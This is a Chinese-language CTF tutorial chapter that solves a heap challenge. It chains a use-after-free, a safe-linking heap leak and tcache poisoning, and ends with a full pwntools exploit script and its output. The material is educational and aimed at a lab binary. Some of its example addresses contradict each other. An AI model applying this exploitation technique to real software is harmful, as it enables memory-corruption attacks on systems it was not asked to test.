@@ -1,0 +1,542 @@
+\section{第五題：house-of-water}
+\label{chap:house}
+
+最後一題。它把前面所有東西串在一起：\textbf{UAF}（ch07）、
+\textbf{safe-linking 的 heap leak}（ch06）、\textbf{tcache poisoning}（ch06 提過名字，
+這裡真的動手做）。
+
+\begin{keybox}[先講這一題最有趣的地方]
+flag \textbf{根本沒有被讀出來印出來}——它在程式啟動時就被複製到 heap 上，
+然後\textbf{一直躺在那裡}。你不需要任何「讀檔案」的函式、
+不需要 \code{system("/bin/sh")}、不需要 leak libc 或 PIE
+（雖然 PIE 是開著的）。
+
+你只要\textbf{讓一次 \code{malloc} 回傳 flag 所在的那塊記憶體}，
+然後用 \code{show} 把它印出來。
+\end{keybox}
+
+\subsection{防禦機制}
+
+\begin{lstlisting}[style=raw]
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled   (未強制)
+IBT:        Enabled   (未強制)
+\end{lstlisting}
+
+\begin{keybox}[看起來很硬，但我們完全不需要繞過它們]
+Canary 是防 stack overflow 的——這題沒有 stack overflow。
+PIE 是防「寫死程式碼位址」的——但我們\textbf{一個程式碼位址都不用}。
+Full RELRO 是防改 GOT 的——不需要。
+\textbf{防禦機制列表只是「你必須走哪條路」的提示，不是每項都要打穿。}
+這題的答案是：全部繞開，只玩 heap。
+\end{keybox}
+
+\subsection{全域陣列與選單}
+
+\code{nm} 一下就知道這題的骨架：
+
+\begin{lstlisting}[style=raw]
+0000000000004040 b chunks       # chunks[64]
+0000000000004240 b sizes        # sizes[64]
+0000000000004440 b freed        # freed[64]  (byte 陣列)
+\end{lstlisting}
+
+\begin{lstlisting}[style=raw]
+1) malloc   2) free   3) edit   4) show   5) exit
+\end{lstlisting}
+
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item \code{chunks[i]}：第 i 格的指標。
+  \item \code{sizes[i]}：當初要的大小（原始 request，不是 chunk size）。
+  \item \code{freed[i]}：\code{0} 或 \code{1}，標記「這格被 free 過了」。
+\end{itemize}
+
+\subsection{\code{setup()}：flag 的第一站}
+
+\begin{lstlisting}[style=asm]
+  1357:  mov    edi,0x80
+  135c:  call   malloc@plt            ; <== 這題第一次 malloc
+  1361:  mov    [rbp-0x10],rax        ; buf
+  ...
+  139b:  lea    rax,[rip+0xc76]       # "./flag.txt"
+  13a2:  mov    rdi,rax
+  13a5:  call   fopen@plt
+  ...
+  13c5:  call   fgets@plt             ; fgets(buf, 0x80, fp)  -> flag 進 heap
+  1403:  call   fclose@plt
+\end{lstlisting}
+
+\begin{keybox}[為什麼 \code{buf} 一定在 \code{heap+0x2a0}]
+這是第六章的 \code{tcache\_perthread\_struct}（\code{0x290} bytes）再來一次：
+
+\begin{lstlisting}[style=raw]
+第一次 malloc(0x80)
+   glibc 先偷偷配 tcache_perthread_struct -> chunk 0x290，佔 heap+0x000 ~ heap+0x290
+   然後才配我們要的 0x80       -> chunk 0x90，標頭在 heap+0x290
+                                   user 指標 = heap+0x290+0x10 = heap+0x2a0
+\end{lstlisting}
+
+實測（gdb）：
+
+\begin{lstlisting}[style=raw]
+0x55555555b000: 0x0000000000000000  0x0000000000000291   <- tcache struct
+0x55555555b290: 0x0000000000000000  0x0000000000000091   <- flag chunk 標頭
+0x55555555b2a0: "flag{local_test_flag_house_of_water}\n"  <- flag 就在這
+\end{lstlisting}
+
+\textbf{所以只要讓某次 \code{malloc} 回傳 \code{heap+0x2a0}，我就贏了。}
+\end{keybox}
+
+\begin{keybox}[如果檔案不存在呢]
+程式有做 fallback：\code{fgets} 讀失敗就自己塞一個假的
+\code{flag\{sing\_sing\_flag\_thxt\}}。所以\textbf{在遠端就算讀不到檔案，
+heap 上依然會有東西可以偷}——這是這題設計上很聰明的一點。
+\end{keybox}
+
+\subsection{四個功能各自的問題}
+
+\subsubsection{\code{do\_free}：就是 UAF 本身}
+
+\begin{lstlisting}[style=asm]
+  16bc:  mov    eax,[rbp-0x4]        ; idx
+  16d0:  mov    rax,[rdx+rax*1]      ; rax = chunks[idx]
+  16d4:  mov    rdi,rax
+  16d7:  call   free@plt             ; free(chunks[idx])
+  16e1:  lea    rdx,[rip+0x2d58]     # freed
+  16e8:  mov    BYTE PTR [rax+rdx*1],0x1   ; freed[idx] = 1
+\end{lstlisting}
+
+\textbf{只把 \code{freed[idx]} 設成 1，\code{chunks[idx]} 原封不動。}
+這就是 UAF：free 之後 \code{chunks[idx]} 還是原本的位址，
+而且 \code{edit}/\code{show} 都還會用它。\textbf{和第四題同一個病。}
+
+\subsubsection{\code{check\_bounds}：那個 \code{-0x10} 的「禮物」}
+
+\code{edit} 和 \code{show} 都會先呼叫 \code{check\_bounds(idx, off, len)}：
+
+\begin{lstlisting}[style=asm]
+  1520:  cmp    [rbp-0x28],0x0       ; len
+  1525:  jle    die                  ; len <= 0 就死
+  1527:  cmp    [rbp-0x28],0x400
+  152f:  jle    ok                   ; len <= 0x400 才行
+  ...
+  1540:  movzx  eax,BYTE PTR [rax+rdx*1]  ; freed[idx] ?
+  1552:  je     zero
+  1554:  mov    rax,0xfffffffffffffff0 ; freed -> 下限 -0x10
+  155d:  mov    eax,0x0                 ; 沒 freed -> 下限 0
+  156a:  cmp    rax,[rbp-0x8]           ; off >= 下限 ?
+  ...
+  1587:  add    rax,rdx                 ; off + len
+  158a:  lea    rcx,[rax+0x10]          ; + 0x10
+  15a6:  add    rax,0x10                ; sizes[idx] + 0x10
+  15aa:  cmp    rcx,rax
+  15ad:  jbe    ok                     ; off+len <= sizes[idx]
+\end{lstlisting}
+
+翻譯成 C：
+
+\begin{lstlisting}[style=c]
+if (len <= 0 || len > 0x400)                    die("Invalid length");
+long lo = freed[idx] ? -0x10 : 0;               /* 被 free 過才允許 -0x10 */
+if (off < lo)                                   die("Invalid offset");
+if (off + len > sizes[idx])                     die("Out of bounds");
+\end{lstlisting}
+
+\begin{whybox}[那個 \code{-0x10} 是什麼意思]
+一個 chunk 的\textbf{標頭}是 16 bytes（\code{prev\_size} + \code{size}），
+而 \code{chunks[idx]} 指的是\textbf{標頭再往後 0x10 的 user 指標}。
+所以「\code{off = -0x10}」正好指回\textbf{標頭開頭}。
+
+換句話說：對一個已經 free 的 chunk，\code{off} 可以到 \code{-0x10}，
+\textbf{你連 chunk 標頭都能讀、能寫}。題目等於主動把
+「free 之後 \code{fd}/\code{size} 都可以摸」這件事打開給你。
+
+（實務上我們只需要 \code{off = 0}——因為 \code{fd} 就在 user+0。
+但你可以用 \code{off=-0x10} 印出標頭來\textbf{驗證}你對 heap 的理解，很值得試。）
+\end{whybox}
+
+實測 \code{show(0, -0x10, 0x20)}（A 已 free）：
+
+\begin{lstlisting}[style=raw]
+prev_size = 0x7f7fde6170c0      <- 前一塊留下來的殘值（不重要）
+size      = 0x111               <- chunk size 0x110 + PREV_INUSE
+\end{lstlisting}
+
+\subsubsection{\code{do\_edit} 與 \code{do\_show}：純粹的讀寫原語}
+
+\begin{lstlisting}[style=asm]
+  ; do_edit 的核心
+  17a4:  mov    esi,0x1
+  17a9:  call   fread@plt        ; fread(chunks[idx]+off, 1, len, stdin)  <- 任意寫
+  ; do_show 的核心
+  1838:  movzx  eax,BYTE PTR [rax]   ; chunks[idx]+off+i
+  184a:  call   printf@plt           ; printf("%02x ", byte)   <- 任意讀（hexdump）
+\end{lstlisting}
+
+\begin{keybox}[\code{show} 是 hexdump，不是 \code{\%s}——這很重要]
+第四題用 \code{printf("\%s")} 讀字串，會被 \code{0x00} 截斷，所以 leak 可能只有 3\textasciitilde4 bytes，
+要靠重試迴圈碰運氣。
+
+這一題用 \textbf{hexdump}（逐 byte 印 \code{\%02x}），\textbf{你要幾個 byte 就給幾個}。
+所以這裡的 leak \textbf{百分之百可靠，不需要重試}。
+
+\textbf{看到「\code{\%s} 讀記憶體」就要擔心 \code{0x00}；看到 hexdump 就不用。}
+\end{keybox}
+
+\subsection{複習：tcache 與 safe-linking}
+
+（細節在第 \ref{sec:safelink} 節，這裡只列等一下要用的三條規則。）
+
+\begin{enumerate}[leftmargin=1.5em,itemsep=2pt]
+  \item 同一種大小的 chunk 放同一個 bin，\textbf{LIFO}：最後 free 的會最先被 \code{malloc} 拿回去。
+  \item 一個 free 掉的 chunk，它的 \code{fd} 存在 \textbf{user+0x0}，\code{key} 存在 \textbf{user+0x8}。
+  \item safe-linking：\code{fd = next \^{} (自己位址 >> 12)}。
+        如果 \code{next} 是 NULL，那 \code{fd} 就\textbf{直接等於「自己位址 >> 12」}。
+\end{enumerate}
+
+\subsection{步驟一：兩個同 bin 的兄弟，從 \code{fd} 反推 heap}
+
+\begin{lstlisting}[style=py]
+SIZE = 0x100                       # chunk size 0x110
+add(0, SIZE)                       # A
+add(1, SIZE)                       # B
+free(0)                            # tcache[0x110] = [A]
+free(1)                            # tcache[0x110] = [B, A]
+\end{lstlisting}
+
+先看 A（它是 bin 的尾巴，\code{fd} 指到 NULL）：
+
+\begin{lstlisting}[style=raw]
+show(0, 0, 0x20)  ->
+  4d cd 0e 59 05 00 00 00 | c4 10 df 66 02 cc 49 3e
+  66 6c 61 67 5f 68 6f 75 73 65 5f 6f 66 5f 77 61
+  ^^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
+        fd (= A>>12)              key (常數)
+\end{lstlisting}
+
+\begin{lstlisting}[style=py]
+fd_a = 0x00000005590ecd4d
+heap = fd_a << 12                 # = 0x5590ecd4d000
+\end{lstlisting}
+
+再看 B（\code{fd} 指到 A）：
+
+\begin{lstlisting}[style=raw]
+show(1, 0, 0x20)  ->
+  89 1a 06 a7 fa 55 00 00 | c4 10 df 66 02 cc 49 3e
+  ^^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
+     fd (= A ^ (B>>12))          key（和 A 的 key 一模一樣！）
+\end{lstlisting}
+
+\begin{keybox}[為什麼 A 的 \code{fd} 就是 heap 的一部分]
+\code{fd = PROTECT(NULL) = NULL \^{} (A的位址 >> 12)}，
+而 \code{A} 的位址是 \code{heap+0x510}。
+
+\[
+(\text{heap}+0x510) \gg 12 = \text{heap} \gg 12
+\]
+
+因為 \code{0x510 < 0x1000}（同一頁），右移 12 位之後\textbf{頁內偏移被丟掉}，
+所以 \code{fd\_a} 就等於 \code{heap >> 12}。反過來 \code{heap = fd\_a << 12}。
+\end{keybox}
+
+\begin{lstlisting}[style=py]
+fd_b = 0x000055faa7061a89
+A    = fd_b ^ fd_a                # = 0x55fff8f99510  == heap+0x510
+assert A >> 12 == fd_a            # 驗算：A 和 fd_a 的「頁」要一致
+\end{lstlisting}
+
+\begin{keybox}[為什麼 \code{A = fd\_b \^{} fd\_a} 成立]
+\code{fd\_b = PROTECT\_PTR(B, A) = A \^{} (B >> 12)}。
+而 A 和 B 是\textbf{同一頁}的鄰居（\code{B = A + 0x110}），
+所以 \code{B >> 12 == A >> 12 == fd\_a}。於是
+
+\[
+A = \code{fd\_b} \;\^{}\; \code{fd\_a}
+\]
+
+\textbf{注意}：\code{A = fd\_b \^{} fd\_a} 只有在 A、B 同頁時才對。
+所以一定要 \code{assert} 檢查 \code{(fd\_b\^{}fd\_a) >> 12 == fd\_a}，
+不然你會在 ASLR 剛好把兩塊分到不同頁時算錯而渾然不知。
+\end{keybox}
+
+\begin{warnbox}[那個 \code{key} 兩塊都一樣，是故意的嗎？]
+不是——那是 glibc 的設計。\code{tcache\_key} 是\textbf{每個 process 一個隨機常數}，
+free 的時候寫進 \code{user+8}，用來偵測 double free
+（\code{free(): double free detected in tcache 2}）。
+所以你看到兩塊的 key 一樣，正好是「\code{key} 是全域常數」的實證。
+\end{warnbox}
+
+\subsection{步驟二：tcache poisoning}
+
+現在 B 還躺在 bin 的頭部，而 \code{fd} 是\textbf{我可以用 \code{edit} 改的}
+（因為 B 已經 free，\code{off=0} 完全合法）。我把 B 的 \code{fd}
+指向\textbf{我想要的任意位址}：
+
+\begin{lstlisting}[style=py]
+target = heap + 0x290                        # 假 chunk 的「標頭」
+edit(1, 0, p64(target ^ (heap >> 12)))       # B->fd = PROTECT(target)
+log.info('poisoned tcache[0x110]: B -> %#x', target)
+\end{lstlisting}
+
+\begin{keybox}[為什麼是 \code{heap+0x290}，而不是 \code{heap+0x2a0}]
+兩個都對，但意思不同：
+
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item \code{malloc} 回傳的是 \code{chunk + 0x10}（\textbf{跳過標頭}）。
+  \item 我想要拿到 \code{heap+0x2a0}（flag），所以我必須「假裝有一塊 chunk」
+        它的標頭在 \code{heap+0x290}。
+  \item 順便驗證對齊：\code{0x290 \% 16 = 0}，符合 glibc 2.35 的
+        \code{aligned\_OK} 檢查（不然會噴 \code{malloc(): unaligned tcache chunk detected}）。
+\end{itemize}
+\end{keybox}
+
+\begin{keybox}[safe-linking 在這裡的角色]
+我\textbf{不能}直接寫 \code{p64(target)}——glibc 讀 \code{fd} 時會做
+\code{REVEAL\_PTR}，也就是\textbf{再 XOR 一次 \code{B>>12}}。
+所以寫進去的值必須是 \code{target \^{} (B >> 12)}，而
+\code{B >> 12 == heap >> 12}（同頁）。這就叫 \textbf{PROTECT}。
+
+實測：\code{PROTECT(0x55fff8f99290) = 0x55faa7061d09}。
+\end{keybox}
+
+\subsection{步驟三：兩次 malloc，第二次就拿到 flag}
+
+\begin{lstlisting}[style=py]
+add(2, SIZE)      # 第一次：彈出 B          -> chunks[2] = B
+add(3, SIZE)      # 第二次：彈出假 chunk    -> chunks[3] = heap+0x2a0  <== flag!
+\end{lstlisting}
+
+\begin{lstlisting}[style=raw]
+[*] chunks[3] = 0x557e6a38b2a0  (flag buffer)
+\end{lstlisting}
+
+\begin{keybox}[看 bin 的變化就知道了]
+\begin{lstlisting}[style=raw]
+free(0); free(1) 之後:   head -> B -> A -> NULL
+edit(1,0,...) 之後:      head -> B -> target(假) -> ?     (A 被繞過了)
+add(2):  彈出 B            head -> target
+add(3):  彈出 target       head -> REVEAL(target->fd)      (count 已歸零，無所謂)
+\end{lstlisting}
+
+\textbf{注意}：把 \code{B->fd} 改成 target 之後，\textbf{A 就被踢出鏈了}
+（B 的下一個不再是 A）。這沒關係——我們不需要 A 了，
+只需要「第 2 次 \code{malloc} 拿到 target」。
+\end{keybox}
+
+\subsection{步驟四：\code{show} 出 flag}
+
+\begin{lstlisting}[style=py]
+return show(3, 0, 0x80)      # chunks[3] 現在 = heap+0x2a0
+\end{lstlisting}
+
+\begin{keybox}[再一次：這不是「讀檔案」]
+\code{chunks[3]} 只是一個普通的指標，值是 \code{heap+0x2a0}。
+\code{show(3, 0, 0x80)} 就只是把那個位址開始的 0x80 個 byte hexdump 出來。
+\textbf{整個 flag 拿到的過程，一次檔案 I/O 都沒有。}
+\end{keybox}
+
+\begin{warnbox}[想偷懶直接讀 A 的殘值？不行]
+\code{show} 的時候你可能會注意到一個誘人的東西——A 的 user+0x10 開始
+竟然是 \code{"flag\_house\_of\_wa"}：
+
+\begin{lstlisting}[style=raw]
+show(0, 0, 0x20) ->
+  4d cd 0e 59 05 00 00 00 | c4 10 df 66 02 cc 49 3e   <- fd, key 蓋掉了前 16 bytes
+  66 6c 61 67 5f 68 6f 75 73 65 5f 6f 66 5f 77 61   <- "flag_house_of_wa"
+\end{lstlisting}
+
+原因是：\code{setup()} 的 \code{fgets} 讀檔時配了一塊 \code{0x1010} 的緩衝區，
+檔案內容就存在那裡；\code{fclose} 之後那塊被回收，而 \textbf{A 剛好配到同一塊記憶體}
+（實測 A 的標頭也在 \code{heap+0x500}，user 在 \code{heap+0x510}，
+和當初 \code{fgets} 緩衝區的 user 指標完全一樣）。
+
+所以 A 的殘值裡有 flag 的碎片。\textbf{但是前面 16 bytes 已经被 \code{fd}/\code{key} 蓋掉了}
+（那 16 bytes 是 \code{"flag\{local\_test"}\ ），你補不回來。
+\textbf{碎片不是 flag。} 老老實實 poisoning 才是正解。
+\end{warnbox}
+
+\subsection{完整腳本}
+
+\begin{lstlisting}[style=py]
+#!/usr/bin/env python3
+"""house-of-water: UAF -> safe-linking heap leak -> tcache poisoning -> flag"""
+import os, re, sys
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
+BIN  = os.path.join(ROOT, 'solve/house/chal_patched')
+elf  = ELF(BIN, checksec=False)
+
+SIZE          = 0x100
+TCACHE_STRUCT = 0x290              # flag chunk 的「假標頭」
+FLAG_USER     = TCACHE_STRUCT + 0x10   # heap+0x2a0
+
+def start():
+    return process(BIN, cwd=os.path.dirname(BIN))
+
+def exploit(io):
+    io.recvuntil(b'> ')
+
+    def add(idx, size):
+        io.sendline(b'1')
+        io.sendlineafter(b'Index: ', str(idx).encode())
+        io.sendlineafter(b'Size: ', str(size).encode())
+        io.recvuntil(b'> ')
+
+    def free(idx):
+        io.sendline(b'2')
+        io.sendlineafter(b'Index: ', str(idx).encode())
+        io.recvuntil(b'> ')
+
+    def edit(idx, off, data):
+        io.sendline(b'3')
+        io.sendlineafter(b'Index: ', str(idx).encode())
+        io.sendlineafter(b'Offset: ', str(off).encode())
+        io.sendlineafter(b'Length: ', str(len(data)).encode())
+        io.recvuntil(b'Data (')
+        io.sendafter(b'bytes): ', data)        # fread()：raw bytes，不加換行
+        io.recvuntil(b'> ')
+
+    def show(idx, off, length):
+        io.sendline(b'4')
+        io.sendlineafter(b'Index: ', str(idx).encode())
+        io.sendlineafter(b'Offset: ', str(off).encode())
+        io.sendlineafter(b'Length: ', str(length).encode())
+        out = io.recvuntil(b'> ')
+        raw = b''.join(bytes.fromhex(h.decode())
+                       for h in re.findall(rb'\b[0-9a-f]{2}\b', out))
+        return raw[:length]
+
+    # --- 1. 同一個 tcache bin 的兩兄弟 --------------------------------
+    add(0, SIZE)                 # A
+    add(1, SIZE)                 # B
+    free(0)                      # tcache[0x110] = [A]
+    free(1)                      # tcache[0x110] = [B, A]
+
+    # --- 2. 從 UAF 的 fd 反推 heap（hexdump，不會被 0x00 截斷）---------
+    fd_a  = u64(show(0, 0, 8))   # A->fd == A >> 12
+    fd_b  = u64(show(1, 0, 8))   # B->fd == A ^ (B >> 12)
+    a_addr = fd_b ^ fd_a
+    heap   = fd_a << 12
+    assert a_addr >> 12 == fd_a, 'A/B 不在同一頁'
+    log.success('A = %#x  (heap+%#x)   heap = %#x', a_addr, a_addr - heap, heap)
+
+    # --- 3. tcache poisoning ------------------------------------------
+    target = heap + TCACHE_STRUCT
+    edit(1, 0, p64(target ^ (heap >> 12)))    # B->fd = PROTECT(target)
+    log.info('poisoned tcache[0x110]: B -> %#x', target)
+
+    # --- 4. 兩次 malloc：B，然後是假 chunk ------------------------------
+    add(2, SIZE)                 # 彈出 B
+    add(3, SIZE)                 # 彈出 target -> chunks[3] = heap+0x2a0
+    log.info('chunks[3] = %#x  (flag buffer)', heap + FLAG_USER)
+
+    # --- 5. 把 flag 印出來 ---------------------------------------------
+    return show(3, 0, 0x80)
+
+io = start()
+flag = exploit(io)
+print(flag.decode(errors='replace'))
+m = re.search(rb'flag\{[^}]*\}', flag)
+log.success('FLAG = %s', m.group().decode())
+io.close()
+\end{lstlisting}
+
+\subsection{執行結果}
+
+\begin{lstlisting}[style=raw]
+[+] Starting local process '.../solve/house/chal_patched': pid 1792076
+[+] A = 0x557e6a38b510  (heap+0x510)   heap = 0x557e6a38b000
+[*] poisoned tcache[0x110]: B -> 0x557e6a38b290
+[*] chunks[3] = 0x557e6a38b2a0  (flag buffer)
+
+flag{local_test_flag_house_of_water}
+[+] FLAG = flag{local_test_flag_house_of_water}
+\end{lstlisting}
+
+\begin{keybox}[\code{0x510} 這個數字是哪來的]
+它不是我們算的，是\textbf{觀察出來的}。實測 layout：
+
+\begin{lstlisting}[style=raw]
+heap+0x000   tcache_perthread_struct   (chunk 0x290)
+heap+0x290   flag chunk                (chunk 0x90)  -> user heap+0x2a0
+heap+0x320   （setup 期間 fopen/fgets 用過的痕跡，已回收）
+heap+0x500   A 的標頭                 (chunk 0x110) -> user heap+0x510
+heap+0x610   B 的標頭                 (chunk 0x110) -> user heap+0x620
+\end{lstlisting}
+
+\textbf{為什麼 A 落在 0x510 而不是緊接 flag 之後？}
+因為 \code{setup()} 期間 \code{fopen} 配了 FILE 結構、\code{fgets} 又配了 4KB 讀取緩衝區，
+\code{fclose} 把它們還了回去，A 的 \code{malloc(0x100)} 就從回收出來的位置切。
+
+\textbf{重點是：這個數字你不需要猜對。}
+腳本裡只用到 \code{heap+0x290}（tcache 結構，規則可推）與 \code{A}（leak 來的），
+\code{0x510} 只是拿來驗算與除錯。
+\end{keybox}
+
+\subsection{「House of \dots」是什麼？}
+
+你在 pwn 世界會一直看到 \code{House of Water}、
+\code{House of Force}、\code{House of Spirit}、
+\code{House of Einherjar}…… 這些名字取自《冰與火之歌》的家族，
+是一串\textbf{以「House of X」命名的 heap 利用技巧}。
+
+它們的共同點是：\textbf{不用傳統的 tcache poisoning}，
+而是去鑽 glibc 內部函式的縫隙——
+例如 \code{malloc\_consolidate}、\code{unlink}、
+\code{\_int\_malloc} 的邊界檢查——所以能繞過比較嚴格的檢查。
+
+\begin{keybox}[這一題其實不是真的 House of Water]
+這題叫 house-of-water 只是\textbf{命名致敬}——它實際的路徑是乾淨的
+\textbf{tcache poisoning}（最經典、最好懂的那一種）。
+真正的 House of Water 牽涉 \code{mp\_}. 與 \code{av->system\_mem} 的操作，
+比這題難得多。
+
+\textbf{所以：看到題目名字很嚇人，先逆下去再說。}
+名字通常只是作者的心情，不是難度保證。
+\end{keybox}
+
+\subsection{這一題要帶走的三件事}
+
+\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
+  \item \textbf{tcache poisoning 的完整三步驟}：
+        (1) 用 UAF 讀出 \code{fd} 反推 heap；
+        (2) 用 UAF 覆寫 \code{fd} 成 \code{PROTECT(target)}；
+        (3) 連 \code{malloc} 兩次，第二次就拿到 \code{target}。
+        \textbf{這個模板可以套用到九成的 tcache 題。}
+  \item \textbf{safe-linking 不是防禦，是「換個方式算」}。
+        \code{fd} 依然是可讀可寫的，只是多了 XOR。
+        你只要知道「同頁 $\Rightarrow$ \code{>>12} 相同」，就能反推。
+  \item \textbf{hexdump 型的 leak 比 \code{\%s} 型的可靠}。
+        題目給你 \code{\%s} 就要準備重試；給你 hexdump 就一次到位。
+        \textbf{先看清楚 leak 的「通道」是什麼，再決定要不要寫重試。}
+\end{enumerate}
+
+\begin{keybox}[五題全部打完了]
+回顧整條路線：
+
+\begin{longtable}{@{}p{4.4cm}p{10.6cm}@{}}
+\toprule
+\textbf{題目} & \textbf{核心觀念}\\
+\midrule
+\endhead
+ret2win & 堆疊溢位、offset = buf + 8、控制 return address\\
+weakness & 同型變化、offset 要從 \code{lea} 驗證\\
+rop\_demo（附加） & ROP chain、\code{pop rdi ; ret}、16-byte 對齊\\
+soul-archive & UAF + type confusion + tcache LIFO 順序\\
+soul-vault & 偽造物件、沒有 \code{\%p} 時從 heap 挖 PIE\\
+house-of-water & tcache poisoning、flag 就在 heap 上\\
+\bottomrule
+\end{longtable}
+
+\textbf{你現在手上的武器}：改 return address、組 ROP chain、
+看 UAF、算 tcache 順序、poison tcache、偽造物件。
+這六招覆蓋了絕大多數入門到中階的 pwn 題。
+\end{keybox}
